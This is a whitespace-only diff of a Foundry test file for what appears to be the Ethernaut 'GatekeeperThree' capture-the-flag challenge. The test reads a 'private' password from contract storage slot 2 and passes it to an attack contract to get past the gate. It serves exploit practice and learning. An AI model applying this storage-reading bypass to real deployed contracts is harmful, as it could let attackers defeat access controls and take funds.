@@ -11,17 +11,17 @@ contract Task_27 is Test {
     GatekeeperThree gatekeeperThree;
     GatekeeperThreeAttack gatekeeperThreeAttack;
 
-    function setUp() public {   
+    function setUp() public {
         gatekeeperThree = new GatekeeperThree();
         gatekeeperThree.createTrick();
-        
+
         gatekeeperThreeAttack = new GatekeeperThreeAttack(payable(address(gatekeeperThree)));
     }
 
     function test_GatekeeperThreeAttack() public {
         bytes32 slot = bytes32(uint256(2));
         bytes32 password = vm.load(address(gatekeeperThree.trick()), slot);
-        
+
         gatekeeperThreeAttack.run{value: 1 ether}(uint256(password));
 
         assertEq(gatekeeperThree.entrant(), tx.origin);
